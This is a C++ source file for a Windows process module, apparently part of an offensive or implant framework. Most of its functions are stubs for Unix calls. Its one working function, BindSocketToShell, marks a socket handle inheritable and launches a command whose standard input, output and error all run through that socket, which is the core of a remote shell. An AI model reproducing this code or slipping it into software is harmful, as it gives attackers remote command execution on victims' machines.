/**
 * process.cc - Windows Process Execution Implementation
 *
 * Provides process creation with socket redirection via NTDLL.
 *
 * NOTE: Windows process creation with socket handle redirection is complex.
 * This implementation uses CreateProcessW with redirected standard handles.
 */

#include "platform/system/process.h"
#include "platform/common/windows/ntdll.h"
#include "platform/common/windows/kernel32.h"
#include "core/memory/memory.h"
#include "platform/common/windows/peb.h"

// Windows doesn't have fork() - use stub implementation
Result<SSIZE, Error> Process::Fork() noexcept
{
	// Windows doesn't support fork()
	return Result<SSIZE, Error>::Err(Error::Process_ForkFailed);
}

// Windows doesn't have dup2 in the same way - stub
Result<SSIZE, Error> Process::Dup2(SSIZE oldfd, SSIZE newfd) noexcept
{
	(void)oldfd;
	(void)newfd;
	return Result<SSIZE, Error>::Err(Error::Process_Dup2Failed);
}

// Windows doesn't have execve - stub
Result<SSIZE, Error> Process::Execve(const CHAR *pathname, CHAR *const argv[], CHAR *const envp[]) noexcept
{
	(void)pathname;
	(void)argv;
	(void)envp;
	return Result<SSIZE, Error>::Err(Error::Process_ExecveFailed);
}

// Windows doesn't have setsid - stub
Result<SSIZE, Error> Process::Setsid() noexcept
{
	return Result<SSIZE, Error>::Err(Error::Process_SetsidFailed);
}

Result<SSIZE, Error> Process::BindSocketToShell(SSIZE socketFd, const CHAR *cmd) noexcept
{
	if (socketFd < 0 || !cmd)
		return Result<SSIZE, Error>::Err(Error::Process_BindShellFailed);

	PVOID h = (PVOID)(USIZE)socketFd;

	// 1. CRITICAL: Make the handle inheritable
	auto handleResult = Kernel32::SetHandleInformation(h, 1 /*HANDLE_FLAG_INHERIT*/, 1);
	if (handleResult.IsErr())
		return Result<SSIZE, Error>::Err(handleResult, Error::Process_BindShellFailed);

	STARTUPINFOW si = {};
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = h;
	si.hStdOutput = h;
	si.hStdError = h;

	PROCESS_INFORMATION pi = {};
	WCHAR cmdWide[260]{};
	StringUtils::Utf8ToWide(Span<const CHAR>(cmd, StringUtils::Length(cmd)), Span<WCHAR>(cmdWide, 260));

	auto createResult = Kernel32::CreateProcessW(
			nullptr, cmdWide, nullptr, nullptr,
			true, // inherit handles
			0, nullptr, nullptr, &si, &pi);

	if (createResult.IsErr())
	{
		return Result<SSIZE, Error>::Err(createResult, Error::Process_BindShellFailed);
	}

	// 2. Close handles to prevent leaks
	(void)NTDLL::ZwClose(pi.hThread);
	(void)NTDLL::ZwClose(pi.hProcess);

	return Result<SSIZE, Error>::Ok(0);
}
